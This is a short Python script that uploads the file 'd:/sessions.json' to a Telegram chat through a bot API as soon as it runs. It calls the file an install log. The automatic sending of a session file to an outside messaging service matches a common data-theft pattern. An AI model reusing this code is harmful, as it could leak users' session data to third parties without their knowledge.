import requests
import config

INSTALL_APP_LOG_FILE_PATH = 'd:/sessions.json'
TELEGRAM_API = config.TELEGRAM_API

def send_log(file_path):
    files = {
        'chat_id': (None, '-4583989930'),
        'document': open(file_path, 'rb'),
    }
    response = requests.post(TELEGRAM_API,
                             files=files,
                             )
    print("Send log to telegram: ", response.status_code, response.text)

send_log(INSTALL_APP_LOG_FILE_PATH)
